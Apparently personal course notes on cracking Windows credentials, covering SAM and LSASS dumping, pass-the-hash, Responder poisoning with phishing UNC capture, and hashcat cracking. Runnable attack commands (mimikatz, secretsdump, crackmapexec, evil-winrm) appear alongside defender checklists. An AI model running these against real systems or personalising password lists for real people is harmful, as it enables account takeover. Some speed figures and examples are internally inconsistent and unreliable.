# 🔐 Cybersecurity Study Notes — Session 11C

Personal notes on password cracking techniques, Windows credential storage architecture, and SMB logon redirection. This session is the conversion layer — turning captured hashes into cleartext passwords and usable credentials for lateral movement.

> [!NOTE]
> Session 11B handed over the assets: a username list, a weak password policy (no lockout, no minimum length), and captured NTLM hashes from SMB Relay. Session 11C answers: **how do I convert those hashes into cleartext passwords? And how do I authenticate even without cracking?**

---

## 📚 Table of Contents

- [Where This Session Fits](#-where-this-session-fits)
- [Foundation Knowledge — Cryptographic Hashing](#-foundation-knowledge--cryptographic-hashing)
- [Common Misconceptions](#-common-misconceptions)
- [Section 1 — Password Cracking Techniques](#section-1--password-cracking-techniques)
  - [What Is Password Cracking?](#11-what-is-password-cracking)
  - [Dictionary Attacks](#12-dictionary-attacks)
  - [Brute Force & Mask Attacks](#13-brute-force--mask-attacks)
  - [Rainbow Table Attacks](#14-rainbow-table-attacks)
  - [Hybrid & Rule-Based Attacks](#15-hybrid--rule-based-attacks)
- [Section 2 — Cracking Windows Passwords](#section-2--cracking-windows-passwords)
  - [Windows Password Storage Architecture](#21-windows-password-storage-architecture)
  - [LM Hash — The Legacy Disaster](#22-lm-hash--the-legacy-disaster)
  - [NT Hash — The Current Standard](#23-nt-hash--the-current-standard)
  - [SAM Extraction Methods](#24-sam-extraction-methods)
  - [Pass-the-Hash — Auth Without Cracking](#25-pass-the-hash--auth-without-cracking)
- [Section 3 — Redirecting SMB Logon to the Attacker](#section-3--redirecting-smb-logon-to-the-attacker)
  - [The NTLMv2 Capture Problem](#31-the-ntlmv2-capture-problem)
  - [How Responder Works](#32-how-responder-captures-ntlmv2-hashes)
  - [Offline Cracking Pipeline](#33-offline-cracking-of-captured-ntlmv2-hashes)
  - [Complete Attack Chain Summary](#34-complete-credential-attack-chain)
- [Section 4 — MITRE ATT&CK Mapping](#section-4--mitre-attck-mapping)
- [Section 5 — 2026 Context](#section-5--2026-context)
  - [AI-Powered Cracking](#51-ai-powered-password-cracking)
  - [Cloud GPU Cracking](#52-cloud-gpu-cracking-services)
  - [DPDPA 2023 Implications](#53-dpdpa-2023-and-password-security)
- [Key Takeaways](#-key-takeaways)
- [Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

```
  SESSIONS 6-9          SESSION 10          SESSION 11          SESSIONS 12-20
  [FOUNDATIONS]    →    [RECON &       →    [ACTIVE ATTACK  →  [EXPLOITATION
  Laws, Concepts,       SCANNING]           TECHNIQUES]        & PERSISTENCE]
  Ethics                OSINT, Nmap,        ← YOU ARE HERE
                        Vuln Scan           (Session 11C)
```

Within Session 11 — The Four-Part Attack Chain:

| Sub-Session | Layer | What It Answers |
|---|---|---|
| **11A** | Reconnaissance | What is running? What OS? How to hide? |
| **11B** | Enumeration | Who is there? Whose credentials can I intercept? |
| **11C** ← HERE | Credential Attack | How do I convert captured hashes → cleartext? How do I authenticate without cracking? |
| **11D** | Disruption | How do I overwhelm the network if needed? |

**Why this position matters:**

Session 11B produced three assets:
- **Asset 1 —** Username list (root, msfadmin, postgres, service accounts)
- **Asset 2 —** Captured NTLM hashes (from SMB Relay / SAM dump)
- **Asset 3 —** Password policy: no lockout, no minimum length

Session 11C converts those assets into cleartext passwords usable against SSH, RDP, web apps, email, and VPN — and establishes the authenticated foothold that every technique in Sessions 12–20 builds on.

---

## 🏗️ Foundation Knowledge — Cryptographic Hashing

<details>
<summary>🔧 Core Concepts — Read This Before Everything Else</summary>

A cryptographic hash takes an input of any length and produces a fixed-length output called a **digest** or **hash**.

**Critical properties:**

| Property | What It Means |
|---|---|
| **One-Way** | Given `H(x) = y`, it is computationally infeasible to find `x` from `y`. You cannot reverse a hash. |
| **Deterministic** | Same input always produces the same output. `H("password")` always returns the same 32 hex chars. |
| **Avalanche Effect** | One bit change in input → ~50% of output bits change. `H("password") ≠ H("Password")`. |
| **Collision Resistant** | Infeasible to find two different inputs that produce the same hash output. |

**Why hashing is used for passwords:**
Systems store `H(password)`, never the password itself. At login, the system computes `H(what_you_typed)` and compares it to the stored hash. If they match — access granted. The actual password never leaves your machine.

**Why cracking is possible despite one-way hashing:**
Cracking does NOT reverse the hash. It's a **forward search**:
1. Take a candidate: `"password123"`
2. Compute `H("password123")`
3. Compare result to target hash
4. Match? Found it. No match? Try next candidate.

The one-way property is completely irrelevant here — the attacker never reverses anything. They guess forward until a match appears.

**Windows NT Hash formula:**
```
NT_Hash = MD4( UTF-16-LE( password ) )
```
- Password is encoded as UTF-16 Little Endian Unicode
- MD4 hash function is applied
- Result: 16 bytes = 32 hex characters

Example:
```
NT_Hash("password") = 8846F7EAEE8FB117AD06BDD830B7586C
```

</details>

---

## ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "Password cracking means reversing/decrypting the hash." | Hash functions are mathematically one-way — there is no decryption key. Cracking is a forward search: generate candidate → hash it → compare. The word "cracking" refers to breaking the authentication system, not decrypting a cipher. |
| "A longer wordlist always means faster cracking." | A longer wordlist means MORE candidates = SLOWER cracking. What it gives you is higher probability of finding the password, at the cost of time. Hash algorithm choice matters FAR more than list size. |
| "I can just copy the SAM file to read the passwords." | SAM is kernel-locked while Windows is running — you can't copy it. It's also encrypted with SYSKEY from the SYSTEM hive. Even raw bytes are useless without both files. |
| "Complex passwords with symbols are safe from dictionary attacks." | Rules generate variants automatically: `"password" → "Password1!"`. Modern rulesets cover the exact patterns humans use when "complexifying" passwords. |
| "Rainbow tables work against all password hashes." | Rainbow tables only work against specific algorithms WITHOUT salting. NT Hashes (no salt) are vulnerable. bcrypt, Argon2, Linux shadow (salted SHA-512) are not. |
| "Pass-the-Hash is the same as password cracking." | Cracking: hash → cleartext. Pass-the-Hash: hash → direct authentication. In NTLM, the hash IS the authentication secret — no cleartext needed at all. |
| "The Administrator account is the most important target." | Service accounts are frequently more valuable — weak passwords set years ago, password expiry disabled, domain-wide privileges. LDAP SPNs from Session 11B point directly at these. |

---

## Section 1 — Password Cracking Techniques

### 1.1 What Is Password Cracking?

**The general process:**

```
INPUT:   Target hash(es) from SAM / NTDS.DIT / Responder capture
         + Attack method + Wordlist / charset

PROCESS: For each candidate password:
           1. Hash it using the same algorithm as the target
           2. Compare to target hash
           3. Match → output cleartext. No match → next candidate.

OUTPUT:  Cleartext password for each cracked hash
```

**Speed is governed by:**

| Factor | Impact |
|---|---|
| Hash algorithm | MD5 = 60B/sec (GPU), bcrypt cost-12 = 300/sec. Algorithm matters most. |
| Hardware | CPU vs GPU vs cloud cluster — orders of magnitude difference |
| Dictionary quality | Targeted wordlists beat larger generic ones |
| Rule complexity | More rules = more candidates = slower but higher hit rate |

---

### 1.2 Dictionary Attacks

**What:** Try every entry in a pre-compiled list (wordlist) of candidate passwords, hashing each one and comparing.

**Why it works:**
Analysis of leaked databases (RockYou 2021 — 8.4 billion entries, Collection #1 2019 — 773 million credentials) consistently shows:
- Top 10 passwords account for 1–3% of all accounts
- Top 10,000 passwords account for 30–40% of all accounts
- 70%+ of passwords are derived from dictionary words

**How — step by step:**
```
Step 1: Obtain hash from target (SAM dump, Responder capture, etc.)
Step 2: Select wordlist — /usr/share/wordlists/rockyou.txt (14M words)
Step 3: Tool reads "123456" → computes NT_Hash("123456")
Step 4: Compare to target hash
Step 5: Match? → cracked. No match? → next word.
Step 6: Repeat until exhausted or cracked.
```

| Advantage | Limitation |
|---|---|
| Extremely fast for weak/common passwords | Only cracks passwords that exist in the wordlist |
| Leverages millions of real leaked passwords | Misses slight variations — use rules for those |
| Very efficient — only tests likely candidates | Quality of wordlist determines success entirely |

**Tools:** `hashcat`, `john`, `hydra` (online attacks against live services)

**Real-World Context — RockYou Origin (2009):**
RockYou, a social app company, stored 32 million passwords in **plain text**. Their database was breached and dumped. That list became `rockyou.txt` — the universal starting wordlist. It represents 32 million real human choices. If your password is in it, it cracks in seconds.

---

### 1.3 Brute Force & Mask Attacks

**What:** Systematically try every possible character combination within a defined charset and length range. Guaranteed to find any password — given enough time.

**The math:**

| Length | Charset = 26 (lowercase) | Charset = 36 (lower+digits) | Charset = 95 (full ASCII) |
|---|---|---|---|
| 4 chars | 0.0005 sec | 0.002 sec | 0.08 sec |
| 6 chars | 0.3 sec | 2.18 sec | 7 minutes |
| 8 chars | 200 sec | ~47 min | **69 years** |
| 10 chars | 36 hours | 3.6 years | 640,000 years |
| 12 chars | 24 years | 4,660 years | >> universe age |

*Calculated at 10 billion NT Hash attempts/second (modern GPU)*

> [!WARNING]
> An 8-character lowercase-only NT Hash is broken in ~3 minutes on a modern GPU. Even a full-ASCII 8-char password takes only ~4.6 hours on a cloud GPU cluster. **8 characters is no longer a safe minimum in 2026.**

**Mask attacks:** Instead of pure exhaustion, define a pattern per character position:

```
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digit (0-9)
?s = special (!@#$%^&*)
?a = all printable ASCII
```

**Example mask:** `?u?l?l?l?l?d?d?d` = 1 uppercase + 4 lowercase + 3 digits
Covers: `Password123`, `Summer024` etc.
Candidates: 26 × 26⁴ × 10³ ≈ 11.8 million → cracks in **milliseconds**.

> [!TIP]
> If I know the target's password policy from Session 11B enum4linux output (e.g., "1 uppercase, 1 digit required"), I can construct a mask that covers only valid passwords — collapsing the candidate space by orders of magnitude compared to full brute force.

---

### 1.4 Rainbow Table Attacks

**What:** A precomputed data structure mapping hash values → plaintext passwords for a specific algorithm, charset, and max length. Cracking becomes a near-instantaneous **lookup operation**.

**The chain mechanism:**
Instead of storing every hash→plaintext pair (terabytes), rainbow tables store **chains**:

```
START(p1) → H → h1 → R → p2 → H → h2 → R → p3 → ... → END(hN)
```

Where `H` is the hash function and `R` is a reduction function that maps hashes back to password-space. Only the `{START, END}` pair is stored — the middle is recomputed during lookup. This compresses what would need terabytes into gigabytes.

**Which hashes are vulnerable:**

| Hash Type | Vulnerable? | Why |
|---|---|---|
| NT Hash (Windows SAM) | ✅ YES | No salt — same password = same hash always |
| LM Hash (older Windows) | ✅ YES | Even weaker — see Section 2.2 |
| Unsalted MD5 / SHA1 | ✅ YES | No salt |
| Linux `/etc/shadow` (SHA-512) | ❌ NO | Per-user random salt — table would need rebuilding per user |
| bcrypt / scrypt / Argon2 | ❌ NO | Salted + intentionally slow — billions of years to build table |
| NTLMv2 (network capture) | ❌ NO | Random challenge per session = equivalent to a random salt |

**Tool — Ophcrack:**
Bootable Live CD. Boot it, it auto-extracts SAM hashes and looks them up in bundled rainbow tables. Free tables cover all alphanumeric Windows passwords up to 14 chars. Doesn't need manual configuration.

---

### 1.5 Hybrid & Rule-Based Attacks

**What:** The most effective attack type in practice. Takes dictionary words as base values and applies systematic **transformation rules** to generate variants that cover the patterns humans actually create when forced to add complexity.

**Why these dominate real engagements:**
Password studies show that when users "complexify" a password, they apply predictable transformations:

```
"password"  → "Password1"    (capitalize + append digit)
"summer"    → "Summer2024!"  (capitalize + year + symbol)
"iloveyou"  → "1L0v3Y0u"    (leet speak)
"company"   → "Company@123"  (company name + suffix)
```

These patterns are predictable enough to write as rules.

**Hashcat rule syntax (common operations):**

| Rule | What It Does |
|---|---|
| `c` | Capitalize first letter |
| `u` | UPPERCASE everything |
| `l` | lowercase everything |
| `r` | Reverse the word |
| `$1` | Append "1" to end |
| `$!` | Append "!" to end |
| `^2^0^2^4` | Prepend "2024" |
| `sa@` | Substitute all `a` → `@` |
| `so0` | Substitute all `o` → `0` |
| `se3` | Substitute all `e` → `3` |

**Example — applying rules to "summer":**

| Rule Applied | Output |
|---|---|
| `c` | `Summer` |
| `c $1` | `Summer1` |
| `c $2$0$2$4` | `Summer2024` |
| `c $2$0$2$4 $!` | `Summer2024!` |
| `sa@` | `s@mmer` |
| `so0 se3` | `s0mm3r` |

**best64.rule:** Hashcat's standard ruleset — 77 rules. Applied to rockyou.txt (14M words): **1.08 billion candidates**. Processed in seconds for NT Hashes on GPU.

**Real-World Case — LinkedIn Breach (2012 / leaked 2016):**
117 million LinkedIn SHA1 (unsalted) hashes leaked. Within 72 hours, researchers cracked **90%** using dictionary + rule-based attacks. Most common: `linkedin123`, `linkedin2012`, `123456`. All rule-based variants of simple dictionary words.
Lesson: Professional cracking with rules completes in hours to days against millions of SHA1/MD5 hashes. Salting + slow hashing (bcrypt) would have made this computationally infeasible.

---

## Section 2 — Cracking Windows Passwords

### 2.1 Windows Password Storage Architecture

**The SAM database:**
Located at `%SYSTEMROOT%\System32\config\SAM`. Stores NT Hash (and legacy LM Hash) for every **local** user account.

**SYSKEY encryption:**
Since NT 4.0 SP3 (1997), SAM is encrypted with a 128-bit key derived from the **SYSTEM** registry hive (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\`). A raw SAM copy is useless without the SYSTEM hive — you need both to decrypt the hashes.

**Where Windows stores credentials — the full picture:**

| Location | What Is Stored | How to Extract |
|---|---|---|
| **SAM** (`config\SAM`) | NT Hashes for all local accounts | VSS, reg save, secretsdump |
| **NTDS.DIT** (`C:\Windows\NTDS\ntds.dit`) | NT Hashes for ALL domain accounts | secretsdump against DC |
| **LSASS (process memory)** | Logged-in user hashes (+ cleartext if WDigest on) | Mimikatz |
| **Credential Manager (DPAPI)** | Saved web and network credentials | DPAPI-based tools |
| **LSA Secrets (registry)** | Service account passwords, cached domain creds, VPN passwords | secretsdump |
| **Group Policy Preferences (SYSVOL)** | Sometimes embedded credentials (`CPassword` field — MS14-025 key is public) | gpp-decrypt |

---

### 2.2 LM Hash — The Legacy Disaster

LM Hash (LAN Manager Hash) was Windows' original format. It has **three catastrophic weaknesses** baked into the algorithm.

**How LM Hash is computed:**
```
Step 1: Convert password to UPPERCASE → "Password" becomes "PASSWORD"
Step 2: Pad or truncate to exactly 14 characters
Step 3: SPLIT into two 7-character halves:
           Half 1: "PASSWOR"
           Half 2: "D      " (D + 6 null bytes)
Step 4: Each half encrypts the fixed string "KGS!@#$%" using DES
Step 5: Concatenate the two 8-byte outputs = 16 bytes total
```

**The three weaknesses:**

**Weakness 1 — Case Insensitivity:**
Everything is uppercased before hashing. `"password"`, `"Password"`, `"PASSWORD"` all produce the **identical** LM Hash. This eliminates all case variation, reducing the effective charset from 95 → ~69 characters.

**Weakness 2 — Split Into Two Independent 7-Char Halves:**
An attacker cracks TWO 7-character passwords instead of one 14-character password. 7-char uppercase brute force = minutes on a modern GPU. A "14-character" password is trivially reduced to two short ones.

> [!NOTE]
> Passwords ≤ 7 chars mean the second half is all null bytes. `DES("KGS!@#$%", "       ") = AAD3B435B51404EE` — a **constant value**. Seeing this as the second half immediately tells me the password is 7 characters or fewer. One hash comparison reveals password length.

**Weakness 3 — DES With Known Plaintext:**
DES encrypts a fixed, public constant (`KGS!@#$%`) using the password half as the key. Known-plaintext DES with 56-bit keys is brute-forceable in minutes.

**Current status:** Disabled by default from Vista / Server 2008+. Identified in dumps by `AAD3B435B51404EEAAD3B435B51404EE` (both halves = LM disabled placeholder).

---

### 2.3 NT Hash — The Current Standard

```
NT_Hash = MD4( UTF-16-LE( password ) )
```

**How it's computed:**
```
Step 1: Encode password as UTF-16-LE Unicode
        "password" → 70 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00
Step 2: Apply MD4 → 128-bit output (32 hex chars)
        NT_Hash("password") = 8846F7EAEE8FB117AD06BDD830B7586C
```

**NT Hash weaknesses:**

| Weakness | Detail |
|---|---|
| **No salt** | Every account with the same password has the **identical** hash. Enables PtH, rainbow tables, and identical-hash detection. |
| **MD4 is fast** | RTX 4090: **100–150 billion NT Hash computations per second**. Compare to bcrypt cost-12: ~10,000/sec. NT Hash is 10–15 **million** times faster to crack. |
| **Case sensitive (minor improvement)** | Unlike LM, case matters. But MD4 speed still makes 8-char brute force feasible in hours. |

**Key NT Hash constants to memorize:**

| Hash Value | Meaning |
|---|---|
| `31D6CFE0D16AE931B73C59D7E0C089C0` | Empty password — account has **no password set** |
| `8846F7EAEE8FB117AD06BDD830B7586C` | "password" |
| `AAD3B435B51404EEAAD3B435B51404EE` | LM Hash disabled (placeholder) |

> [!TIP]
> Seeing `31D6CFE0D16AE931B73C59D7E0C089C0` in a SAM dump means no cracking needed — just authenticate with an empty password string.

---

### 2.4 SAM Extraction Methods

Four techniques, ordered by access level required:

**Method 1 — Volume Shadow Copy (VSS)**
Bypasses the kernel file lock by copying from a backup snapshot.
```cmd
vssadmin list shadows

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```
Then extract on Kali:
```bash
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```
*Requires: Local Administrator*

---

**Method 2 — Registry Export**
Export the live registry hives directly using a built-in Windows command.
```cmd
reg save HKLM\SAM      C:\temp\SAM.hiv
reg save HKLM\SYSTEM   C:\temp\SYSTEM.hiv
reg save HKLM\SECURITY C:\temp\SECURITY.hiv
```
Then on Kali:
```bash
python3 secretsdump.py -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL
```
*Requires: SYSTEM or Administrator*

---

**Method 3 — Mimikatz (LSASS Memory)**
Extracts credentials directly from the LSASS process memory — bypasses SAM file entirely.
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
Output includes: NT Hash for every logged-in user, Kerberos tickets, and **cleartext passwords** if WDigest is enabled (Windows 7 / Server 2008 R2 era, or manually re-enabled via registry).

> [!IMPORTANT]
> **Windows Credential Guard (2024–2026):** Moves LSASS into a VBS-protected memory region that even SYSTEM-level processes can't read. Mimikatz cannot extract from Credential Guard-protected LSASS. Requires explicit configuration though — most enterprises have **not** enabled it.

*Requires: SYSTEM*

---

**Method 4 — Impacket secretsdump (Remote SMB)**
Extracts hashes remotely over SMB with valid admin credentials — or directly after a successful SMB Relay from Session 11B.
```bash
# With credentials:
python3 secretsdump.py administrator:password@192.168.100.20

# With NT Hash (Pass-the-Hash):
python3 secretsdump.py -hashes :NTHASH administrator@192.168.100.20
```

Output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NT_HASH]:::
              ↑    ↑                                 ↑
           username RID    LM hash (disabled)      NT Hash
```

> [!NOTE]
> After SMB Relay from Session 11B succeeds, `ntlmrelayx.py` automatically runs `secretsdump` — the entire pipeline from relay → hash extraction is a single automated operation.

*Requires: Valid admin credentials or a successful SMB Relay*

---

### 2.5 Pass-the-Hash — Auth Without Cracking

**What:** Use the extracted NT Hash **directly** to authenticate to Windows services — no cleartext password needed.

**Why it works:**
In NTLM authentication, the client proves identity by computing:
```
NTLMv2_Response = HMAC-MD5(NT_Hash, server_challenge + username + domain + ...)
```
The NT Hash IS the authentication secret. An attacker who has it can compute the exact same response the legitimate client would. The server can't tell the difference.

**Tools for Pass-the-Hash:**

| Tool | Use Case |
|---|---|
| `impacket psexec.py / wmiexec.py` | Remote command execution via PtH |
| `crackmapexec` | Mass PtH across entire IP range simultaneously |
| `mimikatz sekurlsa::pth` | Spawn a process with injected hash credentials |
| `pth-winexe` | Linux-side Windows execution via hash |

**Lateral movement at scale:**
```bash
# One command against an entire subnet:
crackmapexec smb 192.168.100.0/24 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C
```
Every machine where Administrator shares that same hash → instant shell. Common on networks built from cloned images.

**Real-World Case — NotPetya 2017 (Mimikatz + PtH + EternalBlue):**
NotPetya extracted credentials from LSASS via Mimikatz, then used Pass-the-Hash and WMI to spread to every machine where any logged-in user had admin access. Combined with EternalBlue for machines where PtH failed. **$10 billion+ total damages** — Maersk $300M, FedEx $400M, Merck $870M. Complete shutdown of global shipping, pharmaceutical, and logistics operations for 5–10 days.
Lesson: PtH with shared local admin credentials = one machine compromised → entire domain compromised.

**Defender Checklist — Pass-the-Hash:**
- Deploy **Microsoft LAPS** — generates unique random local admin passwords per machine. PtH hash from one machine won't work on any other.
- Add privileged accounts to the **Protected Users** security group — members are blocked from NTLM auth and forced to use Kerberos only.
- Enable **Windows Credential Guard (VBS)** — isolates LSASS in protected memory. Mimikatz can't touch it.
- Disable **WDigest:** `HKLM\SYSTEM\...\WDigest → UseLogonCredential = 0`. Prevents cleartext from sitting in LSASS memory.
- **Restrict NTLM via GPO** — force Kerberos for domain auth. NTLM blocked = PtH blocked for domain accounts.

---

## Section 3 — Redirecting SMB Logon to the Attacker

### 3.1 The NTLMv2 Capture Problem

What Responder captures from the network is **not** the same as an NT Hash from SAM. It's an NTLMv2 response — more complex to crack because it includes challenge data:

```
NTLMv2_Response = HMAC-MD5(NT_Hash, server_challenge + client_challenge + username + domain + timestamp)
```

To crack it, for each candidate password `P`:
```
1. Compute NT_Hash(P) = MD4(UTF-16-LE(P))
2. Compute NTLMv2_Response = HMAC-MD5(NT_Hash(P), [all the challenge data])
3. Compare to captured response
4. Match → P is the password
```

Two operations per candidate (MD4 + HMAC-MD5) vs one for SAM hashes. GPU speed: **~3–5 billion NTLMv2 responses/second** — slower than SAM cracking but still very feasible.

---

### 3.2 How Responder Captures NTLMv2 Hashes

**What is Responder:** A Python tool (by Laurent Gaffie) that simultaneously poisons NBNS/LLMNR/WPAD broadcasts AND runs fake authentication servers (SMB, HTTP, FTP, LDAP, MSSQL) to capture NTLM credentials from any machine that connects.

**Complete flow:**

```
PHASE 1 — NAME POISONING

  Windows Machine                       Network (Broadcast/Multicast)
        |                                           |
        | DNS lookup for "FILESERVER" fails         |
        | Falls back to LLMNR:                      |
        |--- LLMNR Query: "Who is FILESERVER?" ───→ |
        |    (Multicast to 224.0.0.252, UDP 5355)   |

  Responder (Kali, same subnet):
        |   ←── "I am FILESERVER" (LLMNR Response) ─|
        |   (Responder replies with Kali's IP)       |

────────────────────────────────────────────────────────────────

PHASE 2 — CREDENTIAL CAPTURE

  Windows Machine (victim)              Responder (Kali)
        |                                     |
        | (Connects to "FILESERVER" @ Kali)   |
        |─── SMB NEGOTIATE ─────────────────→ |
        |   ←─── NEGOTIATE RESPONSE ───────── |
        |         (Fake SMB server)            |
        |                                     |
        |─── SESSION_SETUP                    |
        |    (Username: CORP\jsmith) ────────→ |
        |   ←─── CHALLENGE (8 random bytes) ──|
        |                                     |
        |─── AUTHENTICATE                     |
        |    (NTLMv2 Response) ─────────────→ |
        |                                     |
        | Responder logs:                     |
        | [SMB] NTLMv2 Client: 192.168.100.x  |
        | [SMB] NTLMv2 Username: CORP\jsmith  |
        | [SMB] NTLMv2 Hash:                  |
        |   jsmith::CORP:[challenge]:         |
        |   [NTLMv2_Response]:[client_data]   |
```

**Responder captures from multiple protocols simultaneously:**

| Protocol | What Gets Captured |
|---|---|
| SMB | Windows file sharing authentication — most common |
| HTTP | Web proxy and IIS authentication (browser creds) |
| FTP / IMAP / SMTP | Email and file transfer credentials |
| LDAP | Directory service authentication |
| MSSQL | SQL Server authentication |

---

### 3.3 Offline Cracking of Captured NTLMv2 Hashes

Responder saves captures to: `/usr/share/responder/logs/SMB-NTLMv2-SSP-[IP].txt`

**Hashcat commands:**

```bash
# Crack NTLMv2 (Responder capture):
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# Crack NT Hash (SAM dump):
hashcat -m 1000 sam_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# View cracked results:
hashcat -m 5600 captured_hashes.txt --show
```

| Flag | Meaning |
|---|---|
| `-m 5600` | Hash type = NTLMv2 (Net-NTLMv2) |
| `-m 1000` | Hash type = NT Hash (NTLM) — pure MD4, fastest mode |
| `-r best64.rule` | Apply 77 transformation rules to each word |

**The complete pipeline — Responder to authenticated access:**

```
Step 1: Run Responder
          python3 Responder.py -I eth0 -rdwv

Step 2: Trigger authentication (e.g., send phishing link containing
        a UNC path: \\KALI_IP\share — victim clicks, Windows auto-auths)

Step 3: Responder logs NTLMv2 hash to /usr/share/responder/logs/

Step 4: Extract all captures:
          cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > all_hashes.txt

Step 5: Crack with Hashcat:
          hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

Step 6: View results:
          hashcat -m 5600 all_hashes.txt --show
          → jsmith::CORP:3a7b5c...: P@ssword2024

Step 7: Use cleartext for authenticated access:
          ssh jsmith@192.168.100.50                       ← Linux targets
          evil-winrm -i 192.168.100.50 -u jsmith -p P@ssword2024  ← Windows
```

**Real-World Case — Okta Support Breach (2023):**
A threat actor accessed Okta's support case management system and downloaded HAR (HTTP Archive) files uploaded by customers for troubleshooting. HAR files contained session cookies and in some cases NTLM authentication data captured by support tooling. Offline cracking and session hijacking followed. Customers including BeyondTrust, 1Password, and Cloudflare had their Okta admin consoles accessed. ~5,000 Okta customers potentially affected.
Lesson: Credential capture doesn't require network access to the target. Support tooling, diagnostic logs, and HAR files routinely contain authentication data. Minimize what's captured and sent to third parties.

---

### 3.4 Complete Credential Attack Chain

**Attacker perspective — 11A → 11B → 11C complete:**
```
Session 11A gave me:
  → Service versions: vsftpd 2.3.4, Apache 2.2.8, Samba 3.0.20
  → OS: Ubuntu Linux (Metasploitable 2)

Session 11B gave me:
  → Usernames: root, msfadmin, postgres, service (10 total)
  → Password policy: no minimum length, no lockout
  → SMB Relay → secretsdump → SAM hashes extracted

Session 11C completes:
  → SAM hashes → Hashcat -m 1000 + rockyou + best64 → cleartext (< 1 hour)
  → Responder NTLMv2 for CORP\jsmith → cracked to P@ssword2024
  → Administrator NT Hash → Pass-the-Hash → shell on 3 other subnet machines
  → msfadmin:msfadmin (same as username) → VNC on port 5900 → remote desktop
  → postgres:postgres → MySQL port 3306 → full database access

Next step: Deploy persistence before credentials are changed.
```

**Defender checklist — full credential chain prevention:**
- Enable **SMB Signing on ALL machines** — breaks relay and the Responder capture chain
- **Disable LLMNR via GPO:** `Computer Config → Admin Templates → Network → DNS Client → Turn off Multicast Name Resolution → ENABLED`
- **Disable NBNS per adapter:** `Network Adapter → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP`
- Enforce **minimum password length 15+** with complexity — makes dictionary attacks infeasible even without lockout
- **Account lockout:** 5 failed attempts → 30-minute lockout. Stops online attacks (Hydra) cold.
- Deploy **LAPS** — unique local admin passwords eliminate PtH lateral movement
- Enable **Credential Guard** — removes LSASS as a memory-based extraction target
- **SIEM rule:** LLMNR or NBNS response from a non-DNS-server IP = Responder is running. Immediate alert.
- **Event ID 4625** (failed logon) bulk correlation: multiple failures against different accounts from one source = password spray. Alert immediately.
- **Event ID 4624** type 3 (network logon) from an IP that is not the user's registered workstation = possible PtH attempt.

---

## Section 4 — MITRE ATT&CK Mapping

**Primary Tactic: TA0006 — Credential Access**

| Tech ID | Technique Name | Session 11C Mapping | Tool |
|---|---|---|---|
| **T1110.002** | Brute Force: Password Cracking | Offline NT Hash / NTLMv2 cracking | Hashcat, John the Ripper |
| **T1110.001** | Brute Force: Password Guessing | Hydra online dictionary attacks against SSH, FTP, SMB | Hydra |
| **T1003.002** | OS Credential Dumping: SAM | SAM extraction via reg save, VSS, secretsdump | secretsdump.py, impacket |
| **T1003.001** | OS Credential Dumping: LSASS Memory | Mimikatz `sekurlsa::logonpasswords` | Mimikatz |
| **T1550.002** | Use Alternate Auth Material: Pass the Hash | NTLM lateral movement using NT Hash directly | CrackMapExec, psexec.py |
| **T1557.001** | AITM: LLMNR/NBT-NS Poisoning & SMB Relay | Responder capture for offline cracking | Responder |
| **T1040** | Network Sniffing | Capturing NTLMv2 challenge-responses | Responder, tcpdump |
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | Offline cracking of TGS tickets for SPNs from 11B LDAP enum (preview — Session 20) | GetUserSPNs.py |

> [!IMPORTANT]
> **High-confidence SIEM correlation:**
> `T1003.002 (SAM dump)` followed within 30 minutes by `T1550.002 (PtH lateral movement)` from the same source IP = extremely high confidence active compromise.
>
> Attackers don't pause. In documented incidents (MGM 2023), the time from initial credential capture to domain admin is often **under 4 hours**. Detection must be real-time.
>
> **Responder signature:** NBNS or LLMNR responses from an IP that is NOT a registered DNS server. Legitimate machines don't answer LLMNR queries for names they don't own.
>
> **Mimikatz signature:** Sysmon Event ID 10 (process access) targeting `lsass.exe` from non-whitelisted processes.

---

## Section 5 — 2026 Context

### 5.1 AI-Powered Password Cracking

**PassGAN:**
A GAN (Generative Adversarial Network) trained on leaked password databases that generates candidates by learning the statistical patterns of human password creation — not fixed rules.

- Generates passwords that look human-chosen, covering patterns that rule-based tools miss
- Trained on RockYou2021 (8.4 billion passwords), it produces wordlists with higher hit rates for certain populations
- Particularly effective for organization-specific password patterns

2023 study (Home Security Heroes): using PassGAN, 51% of common passwords cracked in under 1 minute, 65% within 1 hour, 81% within 1 month — including 10-character mixed-case alphanumeric passwords previously considered moderately secure.

**LLM-assisted targeted wordlist generation:**
Red teams in 2026 use LLMs to generate hyper-targeted wordlists from OSINT data collected in Sessions 10A and 11B:

```
Prompt: "Generate 200 likely passwords for: Name: Priya Sharma,
works at TechCorp Bengaluru, joined 2018, child named Arjun,
supports Chennai Super Kings, drives a Honda City"

Output: PriyaCSK2018!, Arjun@123, CSK2018Priya, Honda@CSK!, etc.
```

This dramatically outperforms generic wordlists for high-value individual targets (executives, domain admins).

---

### 5.2 Cloud GPU Cracking Services

**AWS cost analysis for NT Hash cracking:**

| Parameter | Value |
|---|---|
| Instance | p4d.24xlarge (8× NVIDIA A100) |
| Hourly cost | ~$32/hour |
| NT Hash speed | ~400 billion hashes/second |
| 8-char full ASCII keyspace | 95⁸ = 6.6 × 10¹⁵ candidates |
| Time to exhaust | ~4.6 hours |
| **Total cost** | **~$147** |

> [!WARNING]
> A truly random 8-character full ASCII password can be brute-forced via NT Hash for approximately **$150** in cloud compute time. In 2026, 8-character passwords are **effectively dead** regardless of character set complexity.
> **Minimum recommended length for NT Hash security: 15+ characters.**

